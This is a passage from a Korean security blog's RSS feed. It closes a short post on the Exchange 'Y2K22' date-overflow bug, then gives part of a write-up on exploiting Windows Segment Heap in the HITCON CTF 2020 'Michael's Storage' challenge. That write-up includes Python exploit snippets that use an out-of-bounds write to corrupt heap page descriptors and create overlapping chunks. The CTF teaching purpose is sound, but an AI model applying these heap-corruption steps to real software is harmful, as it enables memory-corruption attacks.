&#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xC778;&#xC744; &#xBD84;&#xC11D;&#xD55C; &#xACB0;&#xACFC;, &#xD574;&#xB2F9; &#xC0AC;&#xAC74;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A8; &#xBC84;&#xADF8;&#xC5D0; Y2K22&#xB77C;&#xB294; &#xC774;&#xB984;&#xC774; &#xBD99;&#xC5EC;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. Y2K(Millennium bug)&#xC640;&#xC758; &#xC720;&#xC0AC;&#xC131; &#xB54C;&#xBB38;&#xC5D0; &#xBD99;&#xC5EC;&#xC9C4; &#xC774;&#xB984;&#xC785;&#xB2C8;&#xB2E4;.</p><p>Microsoft Exchange 2016&#xACFC; 2019 server&#xC5D0;&#xB294; FIP-FS&#xB77C;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xD0D0;&#xC9C0; &#xC5D4;&#xC9C4;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC5D4;&#xC9C4;&#xC740; 32-bit integer&#xC5D0; &#xB0A0;&#xC9DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; signature file&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; 32-bit integer&#xC5D0; yymmddhhmm&#xC758; &#xD615;&#xD0DC;&#xB85C; &#xB0A0;&#xC9DC;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB4E4; &#xC798; &#xC544;&#xC2DC;&#xB294; &#xAC83;&#xCC98;&#xB7FC; 32-bite integer &#xD615;&#xC2DD;&#xC740; -2147483648 ~ 2147483647 &#xBC94;&#xC704;&#xC758; &#xC815;&#xC218;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB370;&#xC774;&#xD130; &#xD0C0;&#xC785;&#xC785;&#xB2C8;&#xB2E4;. 22&#xB144; 1&#xC6D4; 1&#xC77C; 0&#xC2DC; 1&#xBD84;&#xC744; &#xB73B;&#xD558;&#xB294; 2201010001&#xC774; integer&#xC5D0;&#xC11C; &#xD5C8;&#xC6A9;&#xD558;&#xB294; &#xC815;&#xC218; &#xBC94;&#xC704;&#xB97C; &#xB118;&#xC5B4;&#xC11C;&#xAC8C; &#xB418;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xD0D0;&#xC9C0; &#xC5D4;&#xC9C4;&#xC758; &#xB0A0;&#xC9DC; &#xAC80;&#xC99D; &#xB8E8;&#xD2F4;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; queue&#xC5D0; &#xC313;&#xC774;&#xAC8C; &#xB41C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">Log</span> Name: Application <span class="hljs-attribute">Source</span>: FIPFS <span class="hljs-attribute">Logged</span>: <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">03</span>:<span class="hljs-number">42</span> AM <span class="hljs-attribute">Event</span> ID: <span class="hljs-number">5300</span> <span class="hljs-attribute">Level</span>: Error <span class="hljs-attribute">Computer</span>: server<span class="hljs-number">1</span>.contoso.com<span class="hljs-attribute">Description</span>: The FIP-FS <span class="hljs-string">&quot;Microsoft&quot;</span> Scan Engine failed to load. PID: <span class="hljs-number">23092</span>, Error Code: <span class="hljs-number">0</span>x<span class="hljs-number">80004005</span>. Error Description: Can&apos;t convert <span class="hljs-string">&quot;2201010001&quot;</span> to long.</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/exchange/">exchange</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/integer/">integer</category>
      
      <category domain="https://hackyboiz.github.io/tags/anti-virus/">anti-virus</category>
      
      
      <comments>https://hackyboiz.github.io/2022/01/04/fabu1ous/2022-01-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Hip하게 Heap 정복하기 Part 4 - HITCON 2020 Michael&#39;s Storage(2)</title>
      <link>https://hackyboiz.github.io/2021/12/19/l0ch/segment-heap-part4/</link>
      <guid>https://hackyboiz.github.io/2021/12/19/l0ch/segment-heap-part4/</guid>
      <pubDate>Sun, 19 Dec 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot;&gt;&lt;a href=&quot;#&amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE30;&quot; clas</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC2DC;&#xB9AC;&#xC988;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC2DC;&#xB9AC;&#xC988; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 1 - Segment Heap(1)</a><br><a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 2 - Segment Heap(2)</a><br><a href="https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 3 - HITCON 2020 Michael&#x2019;s Storage </a><br>Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 4 - HITCON 2020 Michael&#x2019;s Storage(2) &#x2190; Now!<br><a href="https://hackyboiz.github.io/2022/01/09/l0ch/segment-heap-part5/">Hip&#xD558;&#xAC8C; Heap &#xC815;&#xBCF5;&#xD558;&#xAE30; Part 5 - HITCON 2020 Michael&#x2019;s Storage(3)</a></p><h1 id="HITCON-CTF-2020-Archangel-Michael&#x2019;s-Storage"><a href="#HITCON-CTF-2020-Archangel-Michael&#x2019;s-Storage" class="headerlink" title="HITCON CTF 2020 - Archangel Michael&#x2019;s Storage"></a>HITCON CTF 2020 - Archangel Michael&#x2019;s Storage</h1><p>&#xC800;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xC758; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD588;&#xC73C;&#xB2C8; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC9DC;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;! &#xBA3C;&#xC800; &#xC8FC;&#xC18C;&#xB97C; leak &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Overlap-Chunk"><a href="#Overlap-Chunk" class="headerlink" title="Overlap Chunk"></a>Overlap Chunk</h2><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA74; HeapAlloc&#xC744; &#xC0AC;&#xC6A9;&#xD574; Private Heap&#xC5D0; &#xD560;&#xB2F9;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OOB Write&#xB97C; &#xC774;&#xC6A9;&#xD574; <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#HEAP-PAGE-RANGE-DESCRIPTOR">_HEAP_PAGE_RANGE_DESCRIPTOR</a>&#xC758; <code>UnitCount</code>&#xB97C; Overwrite&#xD569;&#xB2C8;&#xB2E4;.  <code>UnitCount</code>&#xB294; Subsegment&#xC758; &#xD398;&#xC774;&#xC9C0; &#xC218;, &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; Subsegment&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. UnitCount&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xC6D0;&#xB798; Subsegment&#xBCF4;&#xB2E4; &#xD070; &#xD06C;&#xAE30;&#xB97C; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xACA0;&#xC8E0;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xC81C;&#xD55C; Subsegment&#xB97C;  &#xB2E4;&#xC2DC; &#xD560;&#xB2F9;&#xD55C; &#xB2E4;&#xC74C; &#xD560;&#xB2F9;&#xD558;&#xB294; SubSegment&#xB294; &#xAE30;&#xC874;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB358; SubSegment &#xC8FC;&#xC18C;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xAC8C; &#xB418;&#xACE0;  &#xB450; &#xCCAD;&#xD06C;&#xAC00; &#xACB9;&#xCE5C; Overlap Chunk &#xC0C1;&#xD0DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB9BC;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xC774;&#xD574;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled.png" alt="Untitled"></p><p>&#xC6B0;&#xC120; <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#HEAP-PAGE-SEGMENT">_HEAP_PAGE_SEGMENT</a>&#xB294; <code>_HEAP_PAGE_RAGE_DESCRIPTOR</code> &#xBC30;&#xC5F4;&#xC774; &#xC788;&#xB294; SubSegment &#xD5E4;&#xB354;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xADF8; &#xB4A4;&#xC5D0; &#xAC01; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xBC30;&#xC5F4;&#xC774; &#xC788;&#xB294;&#xB370;, &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; &#xBC30;&#xC5F4;&#xC758; &#xCCAB; &#xBC88;&#xC9F8; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xB294; &#xC4F0;&#xC774;&#xC9C0; &#xC54A;&#xACE0;, &#xB450;&#xBC88;&#xC9F8; &#xC694;&#xC18C;&#xBD80;&#xD130; &#xAC01;&#xAC01; 0x2000 &#xC774;&#xD6C4;&#xC758; SubSegment &#xD06C;&#xAE30;&#xC640; &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xACE0; &#xC788;&#xC8E0;.</p><p>OOB Write&#xC640; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xB450; &#xBC88;&#xC9F8; SubSegmnt&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR-&gt;UniCount</code>&#xB97C; &#xC218;&#xC815;&#xD558;&#xBA74;, &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; &#xC138; &#xBC88;&#xC9F8; Segment&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD558;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%201.png" alt="Untitled"></p><p>&#xADF8;&#xB9AC;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xBA74; &#xC544;&#xB798; &#xADF8;&#xB9BC;&#xCC98;&#xB7FC; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%202.png" alt="Untitled"></p><p>&#xB450; &#xBC88;&#xC9F8; SubSegmnt&#xC758; &#xBC94;&#xC704;&#xAC00; &#xC138; &#xBC88;&#xC9F8; SubSegment&#xAE4C;&#xC9C0; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC73C;&#xB2C8; &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xC911;&#xC778; &#xC138; &#xBC88;&#xC9F8; SubSegment&#xAE4C;&#xC9C0; &#xD574;&#xC81C;&#xD558;&#xAC8C; &#xB418;&#xC8E0;.</p><p>&#xC774;&#xD6C4; &#xB124; &#xBC88;&#xC9F8;, &#xB2E4;&#xC12F;&#xBC88;&#xC9F8; SubSegment&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.   </p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%203.png" alt="Untitled"></p><p>&#xD574;&#xC81C;&#xB41C; &#xACF5;&#xAC04;&#xC5D0; &#xC7AC;&#xD560;&#xB2F9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB124; &#xBC88;&#xC9F8; SubSegment&#xB294; &#xAE30;&#xC874; &#xB450; &#xBC88;&#xC9F8; SubSegment &#xC704;&#xCE58;&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xB2E4;&#xC12F;&#xBC88;&#xC9F8; SubSegment&#xB294; <code>_HEAP_PAGE_RAGNE_DESCRIPTOR</code> &#xBCC0;&#xC870;&#xB85C; &#xC778;&#xD574; &#xD574;&#xC81C;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xC778;&#xC2DD;&#xD55C; &#xC138; &#xBC88;&#xC9F8; SubSegment &#xC704;&#xCE58;&#xC5D0; &#xC7AC;&#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xC911;&#xBCF5;&#xB41C; &#xCCAD;&#xD06C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; Overlap Chunk&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774; Overlap Chunk&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xBA74; arbitrary read/write&#xB85C; &#xD544;&#xC694;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; leak&#xD558;&#xB294; &#xAC83;&#xBD80;&#xD130; &#xC775;&#xC2A4;&#xAE4C;&#xC9C0; &#xAC00;&#xB2A5;&#xD558;&#xACD8;&#xC8E0;!</p><h2 id="Overlap-Chunk-Archangel-Michael&#x2019;s-Storage"><a href="#Overlap-Chunk-Archangel-Michael&#x2019;s-Storage" class="headerlink" title="Overlap Chunk - Archangel Michael&#x2019;s Storage"></a>Overlap Chunk - Archangel Michael&#x2019;s Storage</h2><p>&#xC6B0;&#xC120; &#xCCAD;&#xD06C;&#xB97C; &#xD560;&#xB2F9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs python">alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 0</span>alloc(<span class="hljs-number">1</span>,<span class="hljs-number">0x1337</span>) <span class="hljs-comment"># secret 1</span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 2</span>alloc(<span class="hljs-number">3</span>,<span class="hljs-number">0x20000</span><span class="hljs-number">-1</span>) <span class="hljs-comment"># str 3 (overlap chunk)</span>alloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x3bd0</span>) <span class="hljs-comment"># int 4</span>alloc(<span class="hljs-number">0</span>,<span class="hljs-number">0x8000</span>) <span class="hljs-comment"># int 5</span></code></pre><p><img src="/2021/12/19/l0ch/segment-heap-part4/pic1.png" alt="pic1.png"></p><p><code>binary+0x5640</code> &#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xC804;&#xC5ED;&#xBCC0;&#xC218; <code>Storage</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xD560;&#xB2F9;&#xD55C; 6&#xAC1C;&#xC758; &#xCCAD;&#xD06C;&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB38;&#xC790;&#xC5F4; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC788;&#xB294; &#xB124; &#xBC88;&#xC9F8; Storage&#xB97C; &#xBCF4;&#xBA74;?</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%204.png" alt="Untitled"></p><p>&#xC774;&#xB807;&#xAC8C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xCCAD;&#xD06C;&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xB3C4; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC0DD;&#xC131;&#xB41C; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xB294; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code>&#xC758; &#xD604;&#xC7AC; &#xC0C1;&#xD0DC;&#xB97C; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#Segment-Structure">Part 2</a> &#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; &#xC0DD;&#xC131;&#xB41C; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xB294; <code>_SEGMENT_HEAP</code> &#x2192; <code>SegContexts</code> &#x2192; <code>SegmentListHead</code>&#xC5D0;&#xC11C; &#xCC38;&#xC870;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC5C8;&#xC8E0;. </p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%205.png" alt="Untitled"></p><p><code>_SEGMENT_HEAP</code>&#xC758; <code>SegContexts</code>&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xC11C;,</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%206.png" alt="Untitled"></p><p><code>SegmentListHead</code>&#xB97C; &#xCC38;&#xC870;&#xD558;&#xBA74;</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%207.png" alt="Untitled"></p><p>&#xC774; &#xC8FC;&#xC18C;&#xAC00; <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#HEAP-PAGE-SEGMENT">_HEAP_PAGE_SEGMENT</a> &#xC8FC;&#xC18C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC8FC;&#xC18C;&#xB97C; Segment base&#xB77C;&#xACE0; &#xBD80;&#xB97C;&#xAC8C;&#xC694; (&#xCEA1;&#xCCD0;&#xD558;&#xB2E4;&#xAC00; &#xC5EC;&#xB7EC; &#xBC88; &#xC7AC;&#xC2E4;&#xD589;&#xD574;&#xC11C; &#xD799; &#xC8FC;&#xC18C;&#xAC00; &#xBC14;&#xB00C;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;..! &#xD5F7;&#xAC08;&#xB9AC;&#xC9C0; &#xC54A;&#xAE30; &#xC704;&#xD574; &#xD1B5;&#xC77C;!)</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%208.png" alt="Untitled"></p><p><code>_HEAP_PAGE_SEGMENT</code> &#xC2EC;&#xBCFC;&#xB85C; &#xBCF4;&#xBA74; <code>DescArray</code>&#xD544;&#xB4DC;&#xAC00;  <a href="https://hackyboiz.github.io/2021/10/10/l0ch/segment-heap-part2/#HEAP-PAGE-RANGE-DESCRIPTOR">_HEAP_PAGE_RANGE_DESCRIPTOR</a> &#xAD6C;&#xC870;&#xCCB4; &#xBC30;&#xC5F4;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/pic3.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2021-12-19 15.18.16.png"></p><p>&#xAC01; &#xAD6C;&#xC870;&#xCCB4;&#xB294; 0x20 byte &#xD06C;&#xAE30;&#xACE0; &#xD544;&#xB4DC;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xD558;&#xB098; &#xBCF4;&#xAE30; &#xC5B4;&#xB824;&#xC6B0;&#xB2C8; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD55C;&#xBC88;&#xC5D0; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%209.png" alt="Untitled"></p><p>&#xCCAB; 0x40 byte&#xB294; &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xC640; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; unused &#xC774;&#xACE0;, 0x40&#xBD80;&#xD130;&#xB294; &#xAC01; 0x20 &#xB9C8;&#xB2E4; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xAC01; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xD560;&#xB2F9;&#xB41C; SubSegment&#xC758; &#xCCAB; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; Signature <code>0xCCDDCCDD</code> &#xAC00; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xCCAB; &#xD398;&#xC774;&#xC9C0;&#xC778; &#xACBD;&#xC6B0; UnitSize &#xD544;&#xB4DC;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; &#xD06C;&#xAE30;, &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD398;&#xC774;&#xC9C0; &#xAC1C;&#xC218; &#xC815;&#xBCF4;&#xAC00; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xD06C;&#xAE30;&#xAC00; 21&#xAC1C;&#xB2C8;&#xAE4C; &#xD574;&#xB2F9; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC81C;&#xC678;&#xD558;&#xACE0; 20&#xAC1C;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB354; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xB9D0;&#xC774;&#xACA0;&#xB124;&#xC694;. &#xADF8; &#xB4A4;&#xC5D0; &#xD398;&#xC774;&#xC9C0;&#xB4E4;&#xC740; &#xCCAB; &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; UnitOffset&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB418;&#xC5B4; &#xCCAB; &#xD398;&#xC774;&#xC9C0;&#xC640;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; 20&#xAE4C;&#xC9C0; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. </p><blockquote><p><code>UnitSize</code>&#xC640; <code>UnitOffset</code>&#xC740; &#xAC19;&#xC740; &#xD544;&#xB4DC;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xCCAB; &#xBC88;&#xC9F8; &#xD398;&#xC774;&#xC9C0;&#xBA74; <code>UnitSize</code>, &#xC544;&#xB2C8;&#xBA74; <code>UnitOffset</code>&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC774;&#xC81C; OOB write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC138; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;(SubSegment)&#xC758; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xBCC0;&#xC870;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAC8C;&#xC694;.</p><pre><code class="hljs python"><span class="hljs-comment"># 0x1f017900000 : _HEAP_PAGE_SEGMENT -&gt; Segment base</span><span class="hljs-comment"># segment base + 0x23050 : chunk 2(secret storage)</span><span class="hljs-comment"># segment base + 34010 : chunk 3(int storage)</span>secret_off = <span class="hljs-number">0x23050</span>target_seg_desc_off = <span class="hljs-number">0x698</span>setvalue(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>, -((secret_off-target_seg_desc_off)/<span class="hljs-number">8</span>)<span class="hljs-number">-1</span>,<span class="hljs-number">0x4204ffbd00000103</span>) <span class="hljs-comment"># overwrite size  type 1</span></code></pre><p>&#xC6B0;&#xC120; &#xB450; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; &#xC8FC;&#xC18C;&#xB97C; &#xD65C;&#xC6A9;&#xD574; &#xBCC0;&#xC870;&#xD560; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xB294;&#xB370;, &#xB450; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; &#xC8FC;&#xC18C;&#xB294; <code>Segment base + 0x23050</code> &#xC785;&#xB2C8;&#xB2E4;. <code>_HEAP_PAGE_SEGMENT</code> &#xC8FC;&#xC18C;&#xC640;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC740; 0x23050&#xC774;&#xACE0;, <code>_HEAP_PAGE_SEGMENT</code>&#xB85C;&#xBD80;&#xD130; &#xC138; &#xBC88;&#xC9F8; &#xC138;&#xADF8;&#xBA3C;&#xD2B8;&#xC758; <code>PAGE_RANGE_DESCRIPTOR&#x2192;UnitSize</code> &#xC624;&#xD504;&#xC14B;&#xC740; 0x698&#xC785;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xD55C; &#xD398;&#xC774;&#xC9C0; &#xD06C;&#xAE30;&#xAC00; 0x1000&#xC774;&#xACE0;, &#xD55C; &#xD398;&#xC774;&#xC9C0;&#xB2F9; 0x20 &#xD06C;&#xAE30;&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.<br>&#x2192; 0x34000 &#xC624;&#xD504;&#xC14B;&#xC758; &#xD398;&#xC774;&#xC9C0;&#xB294; 0x680 &#xC624;&#xD504;&#xC14B;&#xC758; <code>_HEAP_PAGE_RANGE_DESCRIPTOR</code> &#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p>setvalue&#xC758; OOB write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <code>Segment base + 0x698</code>  &#xC8FC;&#xC18C;&#xC758; &#xC138; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C; <code>UnitSize</code>&#xB97C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2010.png" alt="Untitled"></p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2011.png" alt="Untitled"></p><p>&#xBCC0;&#xC870; &#xC804; <code>Segment base + 0x680</code> &#xAC12;&#xC740; <code>0x2104ffde00000103</code>&#xC73C;&#xB85C;, <code>UnitSize</code>&#xB294; 0x21&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2012.png" alt="Untitled"></p><p><img src="/2021/12/19/l0ch/segment-heap-part4/Untitled%2013.png" alt="Untitled"></p><p>OOB write&#xB85C; &#xC774;&#xB807;&#xAC8C; <code>UnitSize</code>&#xB97C; 0x42&#xB85C; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xC81C; &#xC138; &#xBC88;&#xC9F8; &#xCCAD;&#xD06C;&#xB97C; 